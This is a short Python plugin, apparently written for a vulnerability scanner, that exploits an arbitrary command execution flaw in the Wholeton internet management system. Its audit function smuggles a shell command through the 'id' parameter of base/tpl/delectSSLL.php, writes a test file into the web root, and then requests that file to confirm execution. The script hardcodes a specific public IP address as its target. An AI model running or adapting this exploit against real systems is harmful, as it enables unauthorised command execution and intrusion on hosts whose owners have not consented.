#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 惠尔顿上网管理系统任意命令执行
#_FileName_ = Huierdun_Command_Execution .py
######建议把之上的东西都带上，以便于辨认######


def assign(service, arg):
    if service == "wholeton": 
        return True, arg 

def audit(arg):
	payload="base/tpl/delectSSLL.php?id=;echo '333333'>/usr/local/WholetonTM/htdocs/test.php"
	url=arg+payload
	code,head,body,errcode,fina_url=curl.curl2(url)
	testurl=arg+'test.php'
	code,head,body,errcode,fina_url=curl.curl2(testurl)
	if code==200 and '333333' in body :
		security_hole(testurl)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wholeton', 'http://222.223.56.116/')[1])